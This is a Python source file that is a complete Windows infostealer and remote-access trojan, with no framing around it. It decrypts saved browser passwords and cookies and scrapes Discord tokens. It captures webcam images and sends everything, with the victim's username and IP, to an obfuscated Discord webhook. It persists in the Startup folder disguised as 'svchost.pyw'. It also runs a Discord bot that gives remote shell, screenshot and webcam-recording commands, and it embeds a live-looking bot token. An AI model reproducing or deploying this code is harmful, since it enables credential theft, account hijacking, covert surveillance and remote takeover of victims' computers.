import os,sys,json,base64,shutil,sqlite3,win32crypt,requests,cv2,subprocess,threading,time,tempfile
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pathlib import Path
import discord
from discord.ext import commands

W=base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjMwNzQ1MDE1MjQ4OTAxMC9rNDhuZ3pUenFrakdaS0g3UjE2aEVZMXJIZFJpZmI5U3Q3TjBYSzcycDJnTnR4WjVvT1V0SUlsb3dlbTBEbEYxN1ZHaQ==").decode()
T=tempfile.gettempdir()
A=os.getenv("APPDATA")
L=os.getenv("LOCALAPPDATA")

def gk(p):
    with open(os.path.join(p,"Local State"),"r",encoding="utf-8") as f:
        j=json.load(f)
    k=base64.b64decode(j["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(k,None,None,None,0)[1]

def dc(b,k):
    try:
        n=b[3:15];c=b[15:]
        return AESGCM(k).decrypt(n,c,None).decode()
    except:
        try:return win32crypt.CryptUnprotectData(b,None,None,None,0)[1].decode()
        except:return ""

def gt():
    tk=[]
    ps={
        "Discord":os.path.join(A,"Discord"),
        "DiscordCanary":os.path.join(A,"discordcanary"),
        "DiscordPTB":os.path.join(A,"discordptb"),
        "Chrome":os.path.join(L,"Google","Chrome","User Data"),
        "Edge":os.path.join(L,"Microsoft","Edge","User Data"),
        "Brave":os.path.join(L,"BraveSoftware","Brave-Browser","User Data"),
        "Opera":os.path.join(A,"Opera Software","Opera Stable"),
        "OperaGX":os.path.join(A,"Opera Software","Opera GX Stable"),
    }
    import re
    for n,p in ps.items():
        dp=os.path.join(p,"Local Storage","leveldb")
        if not os.path.exists(dp):continue
        for f in os.listdir(dp):
            if not f.endswith(".log") and not f.endswith(".ldb"):continue
            try:
                with open(os.path.join(dp,f),"r",errors="ignore") as fi:
                    for l in fi.readlines():
                        for m in re.findall(r"dQw4w9WgXcQ:[^\s\"']+",l):
                            try:
                                t=m.split("dQw4w9WgXcQ:")[1]
                                k=gk(p if "Discord" in n else os.path.join(p))
                                d=dc(base64.b64decode(t),k)
                                if d and d not in tk:tk.append(d)
                            except:pass
                        for m in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}",l):
                            if m not in tk:tk.append(m)
                        for m in re.findall(r"mfa\.[\w-]{84}",l):
                            if m not in tk:tk.append(m)
            except:pass
    return tk

def gp():
    r=[]
    bp=[
        os.path.join(L,"Google","Chrome","User Data"),
        os.path.join(L,"Microsoft","Edge","User Data"),
        os.path.join(L,"BraveSoftware","Brave-Browser","User Data"),
    ]
    for b in bp:
        if not os.path.exists(b):continue
        try:
            k=gk(b)
        except:continue
        for root,dirs,files in os.walk(b):
            for d in dirs+[""]:
                lp=os.path.join(root,d,"Login Data") if d else os.path.join(root,"Login Data")
                if not os.path.isfile(lp):continue
                tp=os.path.join(T,f"ld_{len(r)}.db")
                try:
                    shutil.copy2(lp,tp)
                    cn=sqlite3.connect(tp)
                    cu=cn.cursor()
                    cu.execute("SELECT origin_url,username_value,password_value FROM logins")
                    for u,un,pw in cu.fetchall():
                        p=dc(pw,k)
                        if un and p:r.append(f"{u} | {un} | {p}")
                    cn.close();os.remove(tp)
                except:
                    try:os.remove(tp)
                    except:pass
    return r

def gc():
    r=[]
    bp=[
        os.path.join(L,"Google","Chrome","User Data"),
        os.path.join(L,"Microsoft","Edge","User Data"),
        os.path.join(L,"BraveSoftware","Brave-Browser","User Data"),
    ]
    for b in bp:
        if not os.path.exists(b):continue
        try:
            k=gk(b)
        except:continue
        for root,dirs,files in os.walk(b):
            for d in dirs+[""]:
                cp=os.path.join(root,d,"Cookies") if d else os.path.join(root,"Cookies")
                if not os.path.isfile(cp):continue
                tp=os.path.join(T,f"ck_{len(r)}.db")
                try:
                    shutil.copy2(cp,tp)
                    cn=sqlite3.connect(tp)
                    cu=cn.cursor()
                    cu.execute("SELECT host_key,name,encrypted_value FROM cookies")
                    for h,n,ev in cu.fetchall():
                        v=dc(ev,k)
                        if v:r.append(f"{h} | {n} | {v}")
                    cn.close();os.remove(tp)
                except:
                    try:os.remove(tp)
                    except:pass
    return r

def wp():
    p=os.path.join(T,"wc.png")
    try:
        c=cv2.VideoCapture(0)
        time.sleep(0.5)
        _,f=c.read()
        cv2.imwrite(p,f)
        c.release()
        return p
    except:return None

def ss():
    p=os.path.join(T,"ss.png")
    try:
        import pyautogui
        pyautogui.screenshot(p)
        return p
    except:return None

def sw(d):
    files=[]
    tk=gt()
    tf=os.path.join(T,"tokens.txt")
    with open(tf,"w") as f:
        f.write("\n".join(tk) if tk else "No tokens found")
    files.append(tf)

    pw=gp()
    pf=os.path.join(T,"passwords.txt")
    with open(pf,"w") as f:
        f.write("\n".join(pw) if pw else "No passwords found")
    files.append(pf)

    ck=gc()
    cf=os.path.join(T,"cookies.txt")
    with open(cf,"w") as f:
        f.write("\n".join(ck[:500]) if ck else "No cookies found")
    files.append(cf)

    wf=wp()
    if wf:files.append(wf)

    hn=os.getenv("COMPUTERNAME","unknown")
    un=os.getenv("USERNAME","unknown")
    ip="unknown"
    try:ip=requests.get("https://api.ipify.org",timeout=5).text
    except:pass

    d={"content":f"**New Hit**\n`{un}@{hn}`\nIP: `{ip}`\nTokens: {len(tk)}\nPasswords: {len(pw)}\nCookies: {len(ck)}"}
    fl=[("file",open(f,"rb")) for f in files]
    try:requests.post(W,data=d,files=fl,timeout=15)
    except:pass
    for _,f in fl:f.close()
    for f in files:
        try:os.remove(f)
        except:pass

def ps():
    sp=os.path.join(A,"Microsoft","Windows","Start Menu","Programs","Startup","svchost.pyw")
    if not os.path.exists(sp):
        try:shutil.copy2(sys.argv[0],sp)
        except:pass

def rb():
    b=commands.Bot(command_prefix="!",intents=discord.Intents.all(),help_command=None)

    @b.event
    async def on_ready():pass

    @b.command()
    async def screenshot(x):
        p=ss()
        if p:
            await x.send(file=discord.File(p))
            try:os.remove(p)
            except:pass
        else:await x.send("Failed")

    @b.command()
    async def webcam(x):
        p=wp()
        if p:
            await x.send(file=discord.File(p))
            try:os.remove(p)
            except:pass
        else:await x.send("Failed")

    @b.command()
    async def rwebcam(x,s:int=5):
        p=os.path.join(T,"rv.avi")
        try:
            c=cv2.VideoCapture(0)
            fw=int(c.get(3));fh=int(c.get(4))
            o=cv2.VideoWriter(p,cv2.VideoWriter_fourcc(*'XVID'),20.0,(fw,fh))
            st=time.time()
            while time.time()-st<s:
                _,fr=c.read()
                if _:o.write(fr)
            c.release();o.release()
            await x.send(file=discord.File(p))
            try:os.remove(p)
            except:pass
        except Exception as e:await x.send(f"Failed: {e}")

    @b.command()
    async def shell(x,*,c):
        try:
            o=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30,executable="powershell.exe")
            r=o.stdout+o.stderr
            if len(r)>1900:
                fp=os.path.join(T,"out.txt")
                with open(fp,"w") as f:f.write(r)
                await x.send(file=discord.File(fp))
                os.remove(fp)
            else:await x.send(f"```\n{r or 'No output'}\n```")
        except Exception as e:await x.send(f"Error: {e}")

    @b.command()
    async def cmd(x,*,c):
        try:
            o=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30,executable="cmd.exe")
            r=o.stdout+o.stderr
            if len(r)>1900:
                fp=os.path.join(T,"out.txt")
                with open(fp,"w") as f:f.write(r)
                await x.send(file=discord.File(fp))
                os.remove(fp)
            else:await x.send(f"```\n{r or 'No output'}\n```")
        except Exception as e:await x.send(f"Error: {e}")

    
    bt="MTQ5MjM1MDY5OTY0MjgxODYzMQ.GDMB5H._TNVNbqD97ffLtAfsbuioP9iSN8knftpuIxoDU" 
    if bt:
        try:b.run(bt)
        except:pass

if __name__=="__main__":
    ps()
    threading.Thread(target=sw,args=(W,),daemon=True).start()
    rb()
